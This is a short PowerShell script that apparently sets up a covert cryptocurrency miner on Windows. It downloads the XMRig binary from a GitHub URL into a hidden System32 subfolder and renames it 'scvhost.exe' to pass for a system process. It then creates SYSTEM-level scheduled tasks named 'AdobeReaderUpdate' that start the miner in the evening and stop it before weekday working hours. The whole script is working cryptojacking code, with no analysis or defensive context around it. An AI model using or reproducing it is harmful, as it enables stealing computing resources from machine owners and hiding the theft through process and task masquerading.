# Create etc directory
New-Item C:\Windows\System32\drivers\en-US\etc\ -Type Directory


# Download XMRig
$url = "https://github.com/diggles9991/MG/raw/master/XMR/xmrig.exe"
$output = "C:\Windows\System32\drivers\en-US\etc\xmrig.exe"
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $output)


# Change Directory
CD C:\Windows\System32\drivers\en-US\etc\


# Create renamed copy of Miner
Copy-Item C:\Windows\System32\drivers\en-US\etc\xmrig.exe C:\Windows\System32\drivers\en-US\etc\scvhost.exe


#Delete Miner
Remove-Item C:\Windows\System32\drivers\en-US\etc\xmrig.exe


# Create scheduled Start Task
SCHTASKS /Create /RU "SYSTEM" /tn "AdobeReaderUpdate" /sc Weekly /d * /st 18:00:00 /tr "powershell.exe C:\Windows\System32\drivers\en-US\etc\Line.ps1"


# Create scheduled End Task
SCHTASKS /Create /RU "SYSTEM" /tn "AdobeReaderUpdateEnd" /sc Weekly /d MON,TUE,WED,THU,fri /st 06:00:00 /tr "powershell.exe Stop-Process -Name scvhost"